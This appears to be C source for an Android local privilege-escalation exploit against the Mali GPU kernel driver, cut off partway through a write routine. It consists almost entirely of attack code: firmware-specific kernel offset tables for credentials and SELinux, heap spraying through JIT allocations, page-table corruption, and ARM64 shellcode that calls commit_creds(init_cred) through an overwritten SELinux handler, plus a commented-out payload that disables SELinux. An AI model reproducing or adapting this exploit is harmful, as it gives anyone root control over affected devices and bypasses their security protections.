#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include "stdbool.h"
#include <sys/system_properties.h>
#include <sys/syscall.h>
#include <sys/utsname.h>

#include "mali.h"
#include "mali_base_jm_kernel.h"
#include "midgard.h"

#ifdef SHELL
#define LOG(fmt, ...) printf(fmt, ##__VA_ARGS__)
#else
#include <android/log.h>
#define LOG(fmt, ...) __android_log_print(ANDROID_LOG_ERROR, "exploit", fmt, ##__VA_ARGS__)

#endif //SHELL

#define MALI "/dev/mali0"			//check, may be different on other devices

#define PAGE_SHIFT 12

#define BASE_MEM_ALIAS_MAX_ENTS ((size_t)24576)

#define PFN_DOWN(x)	((x) >> PAGE_SHIFT)

#define SPRAY_PAGES 25

#define SPRAY_NUM 128

#define FLUSH_SIZE (0x1000 * 0x180)		//increasing = less 'out of memory' results but more crashes (default 0x1000 * 0x100)

#define SPRAY_CPU 0

#define POOL_SIZE 16384				//may be different on other devices

#define RESERVED_SIZE 32

#define TOTAL_RESERVED_SIZE 1024

#define FLUSH_REGION_SIZE 500

#define NUM_TRIALS 100

#define KERNEL_BASE 0x1080000			//raven's kernel load address

#define OVERWRITE_INDEX 256

#define ADRP_INIT_INDEX 0

#define ADD_INIT_INDEX 1

#define ADRP_COMMIT_INDEX 2

#define ADD_COMMIT_INDEX 3

//offset values from Cube kallsyms, subtract head t _head
// PS7201/942
#define SELINUX_ENFORCING_7201_942 0x184d634
#define SEL_READ_HANDLE_UNKNOWN_7201_942 0x3644b4
#define INIT_CRED_7201_942 0x15eb228
#define COMMIT_CREDS_7201_942 0x4cc70
#define ADD_INIT_7201_942 0x9108a000		//add x0, x0, #0x228
#define ADD_COMMIT_7201_942 0x9131c108		//add x8, x8, #0xc70

// PS7204/1044
#define SELINUX_ENFORCING_7204_1044 0x184d634
#define SEL_READ_HANDLE_UNKNOWN_7204_1044 0x364438
#define INIT_CRED_7204_1044 0x15eb228
#define COMMIT_CREDS_7204_1044 0x4ccc0
#define ADD_INIT_7204_1044 0x9108a000		//add x0, x0, #0x228
#define ADD_COMMIT_7204_1044 0x91330108		//add x8, x8, #0xcc0

// PS7204/1046
#define SELINUX_ENFORCING_7204_1046 0x184d634
#define SEL_READ_HANDLE_UNKNOWN_7204_1046 0x364438
#define INIT_CRED_7204_1046 0x15eb228
#define COMMIT_CREDS_7204_1046 0x4ccc0
#define ADD_INIT_7204_1046 0x9108a000		//add x0, x0, #0x228
#define ADD_COMMIT_7204_1046 0x91330108		//add x8, x8, #0xcc0

// PS7206/1098
#define SELINUX_ENFORCING_7206_1098 0x184d634
#define SEL_READ_HANDLE_UNKNOWN_7206_1098 0x364438
#define INIT_CRED_7206_1098 0x15eb228
#define COMMIT_CREDS_7206_1098 0x4ccc0
#define ADD_INIT_7206_1098 0x9108a000		//add x0, x0, #0x228
#define ADD_COMMIT_7206_1098 0x91330108		//add x8, x8, #0xcc0

// PS7212/1333
#define SELINUX_ENFORCING_7212_1333 0x184d634
#define SEL_READ_HANDLE_UNKNOWN_7212_1333 0x364304
#define INIT_CRED_7212_1333 0x15eb228
#define COMMIT_CREDS_7212_1333 0x4ccc0
#define ADD_INIT_7212_1333 0x9108a000		//add x0, x0, #0x228
#define ADD_COMMIT_7212_1333 0x91330108		//add x8, x8, #0xcc0

// PS7212/1335
#define SELINUX_ENFORCING_7212_1335 0x184d634
#define SEL_READ_HANDLE_UNKNOWN_7212_1335 0x364304
#define INIT_CRED_7212_1335 0x15eb228
#define COMMIT_CREDS_7212_1335 0x4ccc0
#define ADD_INIT_7212_1335 0x9108a000		//add x0, x0, #0x228
#define ADD_COMMIT_7212_1335 0x91330108		//add x8, x8, #0xcc0

// PS7216/1582 (uncofirmed)
#define SELINUX_ENFORCING_7216_1582 0x184d634
#define SEL_READ_HANDLE_UNKNOWN_7216_1582 0x364304
#define INIT_CRED_7216_1582 0x15eb228
#define COMMIT_CREDS_7216_1582 0x4ccc0
#define ADD_INIT_7216_1582 0x9108a000		//add x0, x0, #0x228
#define ADD_COMMIT_7216_1582 0x91330108		//add x8, x8, #0xcc0

// PS7224/1752
#define SELINUX_ENFORCING_7224_1752 0x185d634
#define SEL_READ_HANDLE_UNKNOWN_7224_1752 0x3641dc
#define INIT_CRED_7224_1752 0x15fb228
#define COMMIT_CREDS_7224_1752 0x4ccc0
#define ADD_INIT_7224_1752 0x9108a000		//add x0, x0, #0x228
#define ADD_COMMIT_7224_1752 0x91330108		//add x8, x8, #0xcc0

// PS7229/1850
#define SELINUX_ENFORCING_7229_1850 0x185d634
#define SEL_READ_HANDLE_UNKNOWN_7229_1850 0x3641bc
#define INIT_CRED_7229_1850 0x15fb228
#define COMMIT_CREDS_7229_1850 0x4ccc0
#define ADD_INIT_7229_1850 0x9108a000		//add x0, x0, #0x228
#define ADD_COMMIT_7229_1850 0x91330108		//add x8, x8, #0xcc0

// PS7229/1853
#define SELINUX_ENFORCING_7229_1853 0x185d634
#define SEL_READ_HANDLE_UNKNOWN_7229_1853 0x3641bc
#define INIT_CRED_7229_1853 0x15fb228
#define COMMIT_CREDS_7229_1853 0x4ccc0
#define ADD_INIT_7229_1853 0x9108a000		//add x0, x0, #0x228
#define ADD_COMMIT_7229_1853 0x91330108		//add x8, x8, #0xcc0

// PS7229/1856
#define SELINUX_ENFORCING_7229_1856 0x185d634
#define SEL_READ_HANDLE_UNKNOWN_7229_1856 0x3641bc
#define INIT_CRED_7229_1856 0x15fb228
#define COMMIT_CREDS_7229_1856 0x4ccc0
#define ADD_INIT_7229_1856 0x9108a000		//add x0, x0, #0x228
#define ADD_COMMIT_7229_1856 0x91330108		//add x8, x8, #0xcc0

// PS7234/2039 (unconfirmed)
#define SELINUX_ENFORCING_7234_2039 0x185d634
#define SEL_READ_HANDLE_UNKNOWN_7234_2039 0x36383c
#define INIT_CRED_7234_2039 0x15fb228
#define COMMIT_CREDS_7234_2039 0x4ccc0
#define ADD_INIT_7234_2039 0x9108a000		//add x0, x0, #0x228
#define ADD_COMMIT_7234_2039 0x91330108		//add x8, x8, #0xcc0

// PS7234/2042 (unconfirmed)
#define SELINUX_ENFORCING_7234_2042 0x185d634
#define SEL_READ_HANDLE_UNKNOWN_7234_2042 0x36383c
#define INIT_CRED_7234_2042 0x15fb228
#define COMMIT_CREDS_7234_2042 0x4ccc0
#define ADD_INIT_7234_2042 0x9108a000		//add x0, x0, #0x228
#define ADD_COMMIT_7234_2042 0x91330108		//add x8, x8, #0xcc0

// PS7242/2216
#define SELINUX_ENFORCING_7242_2216 0x185d634
#define SEL_READ_HANDLE_UNKNOWN_7242_2216 0x3641ec
#define INIT_CRED_7242_2216 0x15fb228
#define COMMIT_CREDS_7242_2216 0x4ccc0
#define ADD_INIT_7242_2216 0x9108a000		//add x0, x0, #0x228
#define ADD_COMMIT_7242_2216 0x91330108		//add x8, x8, #0xcc0

// PS7242/2896 (unconfirmed)
#define SELINUX_ENFORCING_7242_2896 0x185d634
#define SEL_READ_HANDLE_UNKNOWN_7242_2896 0x364158
#define INIT_CRED_7242_2896 0x15fb228
#define COMMIT_CREDS_7242_2896 0x4ccc0
#define ADD_INIT_7242_2896 0x9108a000		//add x0, x0, #0x228
#define ADD_COMMIT_7242_2896 0x91330108		//add x8, x8, #0xcc0

// PS7242/2906
#define SELINUX_ENFORCING_7242_2906 0x185d634
#define SEL_READ_HANDLE_UNKNOWN_7242_2906 0x364158
#define INIT_CRED_7242_2906 0x15fb228
#define COMMIT_CREDS_7242_2906 0x4ccc0
#define ADD_INIT_7242_2906 0x9108a000		//add x0, x0, #0x228
#define ADD_COMMIT_7242_2906 0x91330108		//add x8, x8, #0xcc0

// PS7242/3515
#define SELINUX_ENFORCING_7242_3515 0x185d634
#define SEL_READ_HANDLE_UNKNOWN_7242_3515 0x364158
#define INIT_CRED_7242_3515 0x15fb228
#define COMMIT_CREDS_7242_3515 0x4ccc0
#define ADD_INIT_7242_3515 0x9108a000		//add x0, x0, #0x228
#define ADD_COMMIT_7242_3515 0x91330108		//add x8, x8, #0xcc0

// PS7242/3516
#define SELINUX_ENFORCING_7242_3516 0x185d634
#define SEL_READ_HANDLE_UNKNOWN_7242_3516 0x364158
#define INIT_CRED_7242_3516 0x15fb228
#define COMMIT_CREDS_7242_3516 0x4ccc0
#define ADD_INIT_7242_3516 0x9108a000		//add x0, x0, #0x228
#define ADD_COMMIT_7242_3516 0x91330108		//add x8, x8, #0xcc0

// PS7273/2625
#define SELINUX_ENFORCING_7273_2625 0x185d634
#define SEL_READ_HANDLE_UNKNOWN_7273_2625 0x364158
#define INIT_CRED_7273_2625 0x15fb528
#define COMMIT_CREDS_7273_2625 0x4ccc0
#define ADD_INIT_7273_2625 0x9114a000		//add x0, x0, #0x528
#define ADD_COMMIT_7273_2625 0x91330108		//add x8, x8, #0xcc0

// PS7279/2766
#define SELINUX_ENFORCING_7279_2766 0x185d634
#define SEL_READ_HANDLE_UNKNOWN_7279_2766 0x364158
#define INIT_CRED_7279_2766 0x15fb528
#define COMMIT_CREDS_7279_2766 0x4ccc0
#define ADD_INIT_7279_2766 0x9114a000		//add x0, x0, #0x528
#define ADD_COMMIT_7279_2766 0x91330108		//add x8, x8, #0xcc0

// PS7285/2877
#define SELINUX_ENFORCING_7285_2877 0x185d634
#define SEL_READ_HANDLE_UNKNOWN_7285_2877 0x364158
#define INIT_CRED_7285_2877 0x15fb528
#define COMMIT_CREDS_7285_2877 0x4ccc0
#define ADD_INIT_7285_2877 0x9114a000		//add x0, x0, #0x528
#define ADD_COMMIT_7285_2877 0x91330108		//add x8, x8, #0xcc0

// PS7285/2880
#define SELINUX_ENFORCING_7285_2880 0x185d634
#define SEL_READ_HANDLE_UNKNOWN_7285_2880 0x364158
#define INIT_CRED_7285_2880 0x15fb528
#define COMMIT_CREDS_7285_2880 0x4ccc0
#define ADD_INIT_7285_2880 0x9114a000		//add x0, x0, #0x528
#define ADD_COMMIT_7285_2880 0x91330108		//add x8, x8, #0xcc0

// PS7292/2982
#define SELINUX_ENFORCING_7292_2982 0x185d634
#define SEL_READ_HANDLE_UNKNOWN_7292_2982 0x3641d4
#define INIT_CRED_7292_2982 0x15fb528
#define COMMIT_CREDS_7292_2982 0x4ccc0
#define ADD_INIT_7292_2982 0x9114a000		//add x0, x0, #0x528
#define ADD_COMMIT_7292_2982 0x91330108		//add x8, x8, #0xcc0

// PS7292/2984
#define SELINUX_ENFORCING_7292_2984 0x185d634
#define SEL_READ_HANDLE_UNKNOWN_7292_2984 0x3641d4
#define INIT_CRED_7292_2984 0x15fb528
#define COMMIT_CREDS_7292_2984 0x4ccc0
#define ADD_INIT_7292_2984 0x9114a000		//add x0, x0, #0x528
#define ADD_COMMIT_7292_2984 0x91330108		//add x8, x8, #0xcc0

// PS7603/3110
#define SELINUX_ENFORCING_7603_3110 0x185d634
#define SEL_READ_HANDLE_UNKNOWN_7603_3110 0x3641d4
#define INIT_CRED_7603_3110 0x15fb528
#define COMMIT_CREDS_7603_3110 0x4ccc0
#define ADD_INIT_7603_3110 0x9114a000		//add x0, x0, #0x528
#define ADD_COMMIT_7603_3110 0x91330108		//add x8, x8, #0xcc0

// PS7608/3614
#define SELINUX_ENFORCING_7608_3614 0x185d634
#define SEL_READ_HANDLE_UNKNOWN_7608_3614 0x3641d4
#define INIT_CRED_7608_3614 0x15fb528
#define COMMIT_CREDS_7608_3614 0x4ccc0
#define ADD_INIT_7608_3614 0x9114a000		//add x0, x0, #0x528
#define ADD_COMMIT_7608_3614 0x91330108		//add x8, x8, #0xcc0

// PS7614/3227
#define SELINUX_ENFORCING_7614_3227 0x185d634
#define SEL_READ_HANDLE_UNKNOWN_7614_3227 0x3641c4
#define INIT_CRED_7614_3227 0x15fb568
#define COMMIT_CREDS_7614_3227 0x4ccb0
#define ADD_INIT_7614_3227 0x9115a000		//add x0, x0, #0x568
#define ADD_COMMIT_7614_3227 0x9132c108		//add x8, x8, #0xcb0

// PS7624/3337
#define SELINUX_ENFORCING_7624_3337 0x185d634
#define SEL_READ_HANDLE_UNKNOWN_7624_3337 0x3641c4 
#define INIT_CRED_7624_3337 0x15fb568
#define COMMIT_CREDS_7624_3337 0x4ccb0
#define ADD_INIT_7624_3337 0x9115a000		//add x0, x0, #0x568
#define ADD_COMMIT_7624_3337 0x9132c108		//add x8, x8, #0xcb0

// PS7633/3445
#define SELINUX_ENFORCING_7633_3445 0x185d634
#define SEL_READ_HANDLE_UNKNOWN_7633_3445 0x3641d0
#define INIT_CRED_7633_3445 0x15fb568
#define COMMIT_CREDS_7633_3445 0x4ccb0
#define ADD_INIT_7633_3445 0x9115a000		//add x0, x0, #0x568
#define ADD_COMMIT_7633_3445 0x9132c108		//add x8, x8, #0xcb0


static uint64_t sel_read_handle_unknown = SEL_READ_HANDLE_UNKNOWN_7624_3337;

static uint64_t selinux_enforcing = SELINUX_ENFORCING_7624_3337;
/*
Overwriting SELinux to permissive
  strb wzr, [x0]
  mov x0, #0
  ret
*/
//static uint32_t permissive[3] = {0x3900001f, 0xd2800000,0xd65f03c0};

static uint32_t root_code[8] = {0};

static uint8_t jit_id = 1;
static uint8_t atom_number = 1;
static uint64_t gpu_va[SPRAY_NUM] = {0};
static uint8_t* gpu_regions[SPRAY_NUM] = {0};
static int gpu_va_idx = 0;
static void* flush_regions[FLUSH_REGION_SIZE];
static void* alias_regions[SPRAY_NUM] = {0};
static uint64_t reserved[TOTAL_RESERVED_SIZE/RESERVED_SIZE];


struct base_mem_handle {
	struct {
		__u64 handle;
	} basep;
};

struct base_mem_aliasing_info {
	struct base_mem_handle handle;
	__u64 offset;
	__u64 length;
};

static int open_dev(char* name) {
  int fd = open(name, O_RDWR);
  if (fd == -1) {
    err(1, "cannot open %s\n", name);
  }
  return fd;
}

void setup_mali(int fd, int group_id) {
  struct kbase_ioctl_version_check param = {0};
  if (ioctl(fd, KBASE_IOCTL_VERSION_CHECK, &param) < 0) {
    err(1, "version check failed\n");
  }
  //struct kbase_ioctl_set_flags set_flags = {group_id << 3};
  struct kbase_ioctl_set_flags set_flags = {0};
  if (ioctl(fd, KBASE_IOCTL_SET_FLAGS, &set_flags) < 0) {
    err(1, "set flags failed\n");
  } 
}


void* setup_tracking_page(int fd) {
  void* region = mmap(NULL, 0x1000, 0, MAP_SHARED, fd, BASE_MEM_MAP_TRACKING_HANDLE);
  if (region == MAP_FAILED) {
    err(1, "setup tracking page failed");
  }
  return region;
}


void jit_init(int fd, uint64_t va_pages, uint64_t trim_level, int group_id) {
  struct kbase_ioctl_mem_jit_init init = {0};
  init.va_pages = va_pages;
  init.max_allocations = 255;
  init.trim_level = trim_level;
  //init.group_id = group_id;
  //init.phys_pages = va_pages;

  if (ioctl(fd, KBASE_IOCTL_MEM_JIT_INIT, &init) < 0) {
    err(1, "jit init failed\n");
  }
}

uint64_t jit_allocate(int fd, uint8_t atom_number, uint8_t id, uint64_t va_pages, uint64_t gpu_alloc_addr, uint64_t* gpu_alloc_region) {
  struct base_jit_alloc_info info = {0};
  struct base_jd_atom_v2 atom = {0};
  
  info.id = id;
  info.gpu_alloc_addr = gpu_alloc_addr;
  info.va_pages = va_pages;
  info.commit_pages = va_pages;
  info.extension = 0x1000;

  atom.jc = (uint64_t)(&info);
  atom.atom_number = atom_number;
  atom.core_req = BASE_JD_REQ_SOFT_JIT_ALLOC;
  atom.nr_extres = 1;
  struct kbase_ioctl_job_submit submit = {0};
  submit.addr = (uint64_t)(&atom);
  submit.nr_atoms = 1;
  submit.stride = sizeof(struct base_jd_atom_v2);
  if (ioctl(fd, KBASE_IOCTL_JOB_SUBMIT, &submit) < 0) {
    err(1, "submit job failed\n");
  }
  return *((uint64_t*)gpu_alloc_region); 
}

void jit_free(int fd, uint8_t atom_number, uint8_t id) {
  uint8_t free_id = id;

  struct base_jd_atom_v2 atom = {0};

  atom.jc = (uint64_t)(&free_id);
  atom.atom_number = atom_number;
  atom.core_req = BASE_JD_REQ_SOFT_JIT_FREE;
  atom.nr_extres = 1;
  struct kbase_ioctl_job_submit submit = {0};
  submit.addr = (uint64_t)(&atom);
  submit.nr_atoms = 1;
  submit.stride = sizeof(struct base_jd_atom_v2);
  if (ioctl(fd, KBASE_IOCTL_JOB_SUBMIT, &submit) < 0) {
    err(1, "submit job failed\n");
  }
    
}

void mem_flags_change(int fd, uint64_t gpu_addr, uint32_t flags, int ignore_results) {
  struct kbase_ioctl_mem_flags_change change = {0};
  change.flags = flags;
  change.gpu_va = gpu_addr;
  change.mask = flags;
  if (ignore_results) {
    ioctl(fd, KBASE_IOCTL_MEM_FLAGS_CHANGE, &change);
    return;
  }
  if (ioctl(fd, KBASE_IOCTL_MEM_FLAGS_CHANGE, &change) < 0) {
    err(1, "flags_change failed\n");
  }
}

void mem_alloc(int fd, union kbase_ioctl_mem_alloc* alloc) {
  if (ioctl(fd, KBASE_IOCTL_MEM_ALLOC, alloc) < 0) {
    err(1, "mem_alloc failed\n");
  }
}

void mem_alias(int fd, union kbase_ioctl_mem_alias* alias) {
  if (ioctl(fd, KBASE_IOCTL_MEM_ALIAS, alias) < 0) {
    err(1, "mem_alias failed\n");
  }
}

void mem_query(int fd, union kbase_ioctl_mem_query* query) {
  if (ioctl(fd, KBASE_IOCTL_MEM_QUERY, query) < 0) {
    err(1, "mem_query failed\n");
  }
}

void mem_commit(int fd, uint64_t gpu_addr, uint64_t pages) {
  struct kbase_ioctl_mem_commit commit = {.gpu_addr = gpu_addr, pages = pages};
  if (ioctl(fd, KBASE_IOCTL_MEM_COMMIT, &commit) < 0) {
    err(1, "mem_commit failed\n");
  }
}

uint64_t map_gpu(int mali_fd, unsigned int va_pages, unsigned int commit_pages, bool read_only, int group) {
  union kbase_ioctl_mem_alloc alloc = {0};
  alloc.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_CPU_WR; //| (group << 22);
  int prot = PROT_READ;
  if (!read_only) {
    alloc.in.flags |= BASE_MEM_PROT_GPU_WR;
    prot |= PROT_WRITE;
  }
  alloc.in.va_pages = va_pages;
  alloc.in.commit_pages = commit_pages;
  mem_alloc(mali_fd, &alloc);
  return alloc.out.gpu_va;
}

uint64_t alloc_mem(int mali_fd, unsigned int pages) {
  union kbase_ioctl_mem_alloc alloc = {0};
  alloc.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_CPU_WR | BASE_MEM_PROT_GPU_WR;
  int prot = PROT_READ | PROT_WRITE;
  alloc.in.va_pages = pages;
  alloc.in.commit_pages = pages;
  mem_alloc(mali_fd, &alloc);
  return alloc.out.gpu_va;
}

void free_mem(int mali_fd, uint64_t gpuaddr) {
  struct kbase_ioctl_mem_free mem_free = {.gpu_addr = gpuaddr};
  if (ioctl(mali_fd, KBASE_IOCTL_MEM_FREE, &mem_free) < 0) {
    err(1, "free_mem failed\n");
  }
}

uint64_t drain_mem_pool(int mali_fd) {
  union kbase_ioctl_mem_alloc alloc = {0};
  alloc.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_CPU_WR | BASE_MEM_PROT_GPU_WR; // | (1 << 22);
  int prot = PROT_READ | PROT_WRITE;
  alloc.in.va_pages = POOL_SIZE;
  alloc.in.commit_pages = POOL_SIZE;
  mem_alloc(mali_fd, &alloc);
  return alloc.out.gpu_va;
}

void release_mem_pool(int mali_fd, uint64_t drain) {
  struct kbase_ioctl_mem_commit commit = {.gpu_addr = drain, .pages = 0};
  if (ioctl(mali_fd, KBASE_IOCTL_MEM_COMMIT, &commit) < 0) {
    err(1, "mem_commit failed\n");
  }
}

/*
void release_mem_pool(int mali_fd, uint64_t drain) {
  struct kbase_ioctl_mem_free mem_free = {.gpu_addr = drain};
  if (ioctl(mali_fd, KBASE_IOCTL_MEM_FREE, &mem_free) < 0) {
    err(1, "free_mem failed\n");
  }
}
*/

#define CPU_SETSIZE 1024
#define __NCPUBITS  (8 * sizeof (unsigned long))
typedef struct
{
   unsigned long __bits[CPU_SETSIZE / __NCPUBITS];
} cpu_set_t;

#define CPU_SET(cpu, cpusetp) \
  ((cpusetp)->__bits[(cpu)/__NCPUBITS] |= (1UL << ((cpu) % __NCPUBITS)))
#define CPU_ZERO(cpusetp) \
  memset((cpusetp), 0, sizeof(cpu_set_t))

int migrate_to_cpu(int i)
{
    int syscallres;
    pid_t pid = gettid();
    cpu_set_t cpu;
    CPU_ZERO(&cpu);
    CPU_SET(i, &cpu);

    syscallres = syscall(__NR_sched_setaffinity, pid, sizeof(cpu), &cpu);
    if (syscallres)
    {
        return -1;
    }
    return 0;
}

void* flush(int spray_cpu, int idx) {
  migrate_to_cpu(spray_cpu);
  void* region = mmap(NULL, FLUSH_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
  if (region == MAP_FAILED) err(1, "flush failed");
  memset(region, idx, FLUSH_SIZE);
  return region;
}

void reserve_pages(int mali_fd, int pages, int nents, uint64_t* reserved_va) {
  for (int i = 0; i < nents; i++) {
    union kbase_ioctl_mem_alloc alloc = {0};
    alloc.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_CPU_WR | BASE_MEM_PROT_GPU_WR; // | (1 << 22);
    int prot = PROT_READ | PROT_WRITE;
    alloc.in.va_pages = pages;
    alloc.in.commit_pages = pages; //alloc.in.commit_pages = 0;
    mem_alloc(mali_fd, &alloc);
    reserved_va[i] = alloc.out.gpu_va;
  }
}

void map_reserved(int mali_fd, int pages, int nents, uint64_t* reserved_va) {
  for (int i = 0; i < nents; i++) {
    mem_commit(mali_fd, reserved_va[i], pages);
  }
}

uint64_t alias_sprayed_regions(int mali_fd) {
  union kbase_ioctl_mem_alias alias = {0};
  alias.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_CPU_WR | BASE_MEM_PROT_GPU_WR;
  alias.in.stride = SPRAY_PAGES;

  alias.in.nents = SPRAY_NUM;
  struct base_mem_aliasing_info ai[SPRAY_NUM];
  for (int i = 0; i < SPRAY_NUM; i++) {
    ai[i].handle.basep.handle = gpu_va[i];
    ai[i].length = SPRAY_PAGES;
    ai[i].offset = 0;
  }
  alias.in.aliasing_info = (uint64_t)(&(ai[0]));
  mem_alias(mali_fd, &alias);
  printf("alias gpu va %llx\n", alias.out.gpu_va);
/*
  uint64_t region_size = 0x1000 * SPRAY_NUM * SPRAY_PAGES;
  void* region = mmap64(NULL, region_size, PROT_READ, MAP_SHARED, mali_fd, alias.out.gpu_va);
  if (region == MAP_FAILED) {
    err(1, "mmap alias failed");
  }
  alias_regions[0] = region;
*/
  for (int i = 0; i < SPRAY_NUM; i++) {
    void* this_region = mmap64(NULL, 0x1000 * SPRAY_PAGES, PROT_READ, MAP_SHARED, mali_fd,  (uint64_t)alias.out.gpu_va + i * 0x1000 * SPRAY_PAGES);
    if (this_region == MAP_FAILED) {
      err(1, "mmap alias failed %d\n", i);
    }
    alias_regions[i] = this_region;
  }
  // return (uint64_t)(alias_regions[0]);
  return (uint64_t)alias.out.gpu_va;
}

void fault_pages() {
  int read = 0;
  for (int va = 0; va < SPRAY_NUM; va++) {
    uint8_t* this_va = (uint8_t*)(gpu_regions[va]);
    *this_va = 0;
    uint8_t* this_alias = alias_regions[va];
    read += *this_alias;
  }
  LOG("read %d\n", read);
}

int find_freed_idx(int mali_fd) {
  int freed_idx = -1;
  for (int j = 0; j < SPRAY_NUM; j++) {
    union kbase_ioctl_mem_query query = {0};
    query.in.gpu_addr = gpu_va[j];
    query.in.query = KBASE_MEM_QUERY_COMMIT_SIZE;
    if (ioctl(mali_fd, KBASE_IOCTL_MEM_QUERY, &query) < 0) {err(1, "mem query error in find_freed_idx %d\n", j);}
    if (query.out.value != SPRAY_PAGES) {
      LOG("jit_free commit: %d %llu\n", j, query.out.value);
      freed_idx = j;
    }
  }
  return freed_idx;
}

int find_pgd(int freed_idx, int start_pg) {
  uint64_t* this_alias = alias_regions[freed_idx];
  for (int pg = start_pg; pg < SPRAY_PAGES; pg++) {
    for (int i = 0; i < 0x1000/8; i++) {
        uint64_t entry = this_alias[pg * 0x1000/8 + i];
        if ((entry & 0x443) == 0x443) {
          return pg;
        }
    }
  }
  return -1;
}

uint32_t lo32(uint64_t x) {
  return x & 0xffffffff;
}

uint32_t hi32(uint64_t x) {
  return x >> 32;
}

uint32_t write_adrp(int rd, uint64_t pc, uint64_t label) {
  uint64_t pc_page = pc >> 12;
  uint64_t label_page = label >> 12;
  int64_t offset = (label_page - pc_page) << 12;
  int64_t immhi_mask = 0xffffe0;
  int64_t immhi = offset >> 14;
  int32_t immlo = (offset >> 12) & 0x3;
  uint32_t adpr = rd & 0x1f;
  adpr |= (1 << 28);
  adpr |= (1 << 31); //op
  adpr |= immlo << 29;
  adpr |= (immhi_mask & (immhi << 5));
  return adpr;
}

static uint64_t g_init_cred = 0, g_commit_creds = 0;
static int g_verify_only = 0;
static int g_wr_sleep_us = 300000;   // задержка после GPU-записи (уменьшается в режиме скана)
static int g_quiet = 0;              // 1 = не печатать "overwrite addr" (режим скана)

static uint64_t env_hex(const char* name, uint64_t dflt) {
  const char* s = getenv(name);
  if (!s || !*s) return dflt;
  return strtoull(s, NULL, 0);
}

struct prop_cookie { char* buf; size_t cap; };
static void prop_read_cb(void* cookie, const char* name, const char* value, uint32_t serial) {
  (void)name; (void)serial;
  struct prop_cookie* c = (struct prop_cookie*)cookie;
  if (value && c && c->cap) {
    strncpy(c->buf, value, c->cap - 1);
    c->buf[c->cap - 1] = 0;
  }
}
// Читаем свойство через callback-API (legacy __system_property_get на этом bionic
// отдаёт заглушку "Must use __system_property_read_callback() to read").
static int read_fingerprint(const char* name, char* out, size_t cap) {
  out[0] = 0;
  const prop_info* pi = __system_property_find(name);
  if (pi) {
    struct prop_cookie c = { out, cap };
    __system_property_read_callback(pi, prop_read_cb, &c);
    if (out[0]) return (int)strlen(out);
  }
  return __system_property_get(name, out);
}

static void dump_candidate(const char* name, uint64_t off) {
  uint64_t phys = off + KERNEL_BASE;
  LOG("candidate %-24s off=0x%llx phys=0x%llx low12=0x%llx pte=0x%llx\n",
      name, off, phys, off & 0xfff, ((phys >> 12) << 12) | 0x443);
}

void fixup_root_shell(uint64_t init_cred, uint64_t commit_cred, uint64_t read_handle_unknown, uint32_t add_init, uint32_t add_commit) {
  g_init_cred = init_cred;
  g_commit_creds = commit_cred;

  uint32_t init_adpr = write_adrp(0, read_handle_unknown, init_cred);
  //Sets x0 to init_cred
  root_code[ADRP_INIT_INDEX] = init_adpr;
  root_code[ADD_INIT_INDEX] = add_init;
  //Sets x8 to commit_creds
  root_code[ADRP_COMMIT_INDEX] = write_adrp(8, read_handle_unknown, commit_cred);
  root_code[ADD_COMMIT_INDEX] = add_commit;
  root_code[4] = 0xa9bf7bfd; // stp x29, x30, [sp, #-0x10]
  root_code[5] = 0xd63f0100; // blr x8
  root_code[6] = 0xa8c17bfd; // ldp x29, x30, [sp], #0x10
  root_code[7] = 0xd65f03c0; // ret
}

uint64_t set_addr_lv3(uint64_t addr) {
  uint64_t pfn = addr >> PAGE_SHIFT;
  pfn &= ~ 0x1FFUL;
  pfn |= 0x100UL;
  return pfn << PAGE_SHIFT;
}

static inline uint64_t compute_pt_index(uint64_t addr, int level) {
  uint64_t vpfn = addr >> PAGE_SHIFT;
  vpfn >>= (3 - level) * 9;
  return vpfn & 0x1FF;
}

void write_to(int mali_fd, uint64_t gpu_addr, uint64_t value, int atom_number, enum mali_write_value_type type) {
  uint64_t jc_region = map_gpu(mali_fd, 1, 1, false, 0);
  struct MALI_JOB_HEADER jh = {0};
  jh.is_64b = true;
  jh.type = MALI_JOB_TYPE_WRITE_VALUE;
  
  struct MALI_WRITE_VALUE_JOB_PAYLOAD payload = {0};
  payload.type = type;
  payload.immediate_value = value;
  payload.address = gpu_addr;

  uint32_t* section = (uint32_t*)mmap64(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mali_fd, jc_region);
  if (section == MAP_FAILED) {
    err(1, "mmap failed");
  }

  MALI_JOB_HEADER_pack((uint32_t*)section, &jh);
  MALI_WRITE_VALUE_JOB_PAYLOAD_pack((uint32_t*)section + 8, &payload);
  struct base_jd_atom_v2 atom = {0};
  atom.jc = (uint64_t)jc_region;
  atom.atom_number = atom_number;
  atom.core_req = BASE_JD_REQ_CS;
  struct kbase_ioctl_job_submit submit = {0};
  submit.addr = (uint64_t)(&atom);
  submit.nr_atoms = 1;
  submit.stride = sizeof(struct base_jd_atom_v2);
  if (ioctl(mali_fd, KBASE_IOCTL_JOB_SUBMIT, &submit) < 0) {
    err(1, "submit job failed\n");
  }
  usleep(3000);
}

void write_data(int mali_fd, uint64_t data, uint64_t* reserved, uint64_t size, uint64_t value, enum mali_write_value_type type) {
  uint64_t data_offset = (data + KERNEL_BASE) % 0x1000;
  uint64_t curr_overwrite_addr = 0;
  for (int i = 0; i < size; i++) {
    uint64_t base = reserved[i];
    uint64_t end = reserved[i] + RESERVED_SIZE * 0x1000;
    uint64_t start_idx = compute_pt_index(base, 3);
    uint64_t end_idx = compute_pt_index(end, 3);
    for (uint64_t addr = base; addr < end; addr += 0x1000) {
      uint64_t overwrite_addr = set_addr_lv3(addr);
      if (curr_overwrite_addr != overwrite_addr) {
        if (!g_quiet) LOG("overwrite addr : %llx %llx\n", overwrite_addr + data_offset, data_offset);
        curr_overwrite_addr = overwrite_addr;
        write_to(mali_fd, overwrite_addr + data_offset, value, atom_number++, type);
        usleep(g_wr_sleep_us);
      }
